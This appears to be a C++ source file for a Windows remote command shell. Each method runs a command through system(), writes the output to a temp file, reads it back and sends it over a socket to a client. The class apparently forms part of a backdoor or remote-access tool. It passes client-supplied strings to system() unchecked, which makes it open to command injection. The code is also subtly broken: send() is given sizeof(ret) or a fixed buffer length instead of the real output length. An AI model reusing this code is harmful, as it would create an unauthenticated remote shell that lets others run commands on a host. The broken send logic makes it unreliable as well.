#include "Shell.h"
#define FILE_TMP "cmd.tmp"
#define BUFFER_LEN 256

std::string Shell::return_command(const std::string cmd)
{
	std::string rcmd = cmd + " > " + FILE_TMP;
	system(rcmd.c_str());
	std::ifstream file(FILE_TMP, std::ios::in);

	if (file)
	{
		std::string return_c;
		std::string line;
		while (getline(file, line))
		{
			return_c += line+"\n";
		}
		file.close();
		system("ERASE cmd.tmp");
		return return_c;
	}
	else
	{
		return ("Error using the command : " + cmd);
	}
}

void Shell::pwd(SOCKET* client)
{
	std::string ret = return_command("chdir").c_str();
	send(*client, ret.c_str(), sizeof(ret), 0);
}
void Shell::ls(SOCKET* client)
{
	std::string ret = return_command("dir /b");
	send(*client,("\n"+ret).c_str(),BUFFER_LEN,0);
}
void Shell::run(SOCKET* client,const std::string cmd)
{
	std::string ret = return_command(cmd).c_str();
	send(*client, ret.c_str(), sizeof(ret), 0);
}